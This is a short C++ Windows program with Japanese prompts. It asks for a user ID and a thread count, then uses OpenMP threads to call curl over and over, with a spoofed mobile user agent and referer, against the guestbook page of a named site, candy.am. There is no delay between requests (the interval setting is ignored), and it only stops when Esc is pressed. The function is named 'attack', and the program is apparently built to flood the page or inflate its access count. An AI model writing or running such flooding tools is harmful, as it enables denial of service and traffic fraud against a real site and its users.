#define _CRT_SECURE_NO_WARNINGS
#include <iostream>
#include <sstream>
#include <string>
#include <vector>
#include <cstdlib>
#include <ctime>
#include <Windows.h>
#include <omp.h>
using namespace std;

bool endFlag = false;

void attack(string userID, int interval)
{
	ostringstream stream;
	string command;
	stream << "curl -A \"Mozilla/5.0 (Linux; Android 4.4.2; Nexus 4 Build/KOT49H) " <<
		"AppleWebKit/n537.36 (KHTML, like Gecko) Chrome/34.0.1847.114 Mobile Safari/537.36\" " <<
		"-e http://candy.am/ -Ss http://candy.am/" + userID + "/guestbook > nul";
	command = stream.str();

	while (1)
	{
		if (GetAsyncKeyState(VK_ESCAPE)) endFlag = true;
		if (endFlag) return;

		system(command.c_str());
	}

	return;
}

int main(void)
{
	string userID;
	int threadCount = 0, interval = 0;
	cout << "ID > ";
	cin >> userID;
	cout << "スレッド数(1-64) > ";
	cin >> threadCount;
	cout << "間隔(ミリ秒指定) > ";
	cin >> interval;

	omp_set_dynamic(0);
	omp_set_num_threads(threadCount);

	cout << "アクセス対象 : http://candy.am/" << userID << endl;
	cout << "Escで終了" << endl;

	#ifdef _OPENMP
	#pragma omp parallel
	#endif
	attack(userID, interval);

	system("pause");
	return 0;
}
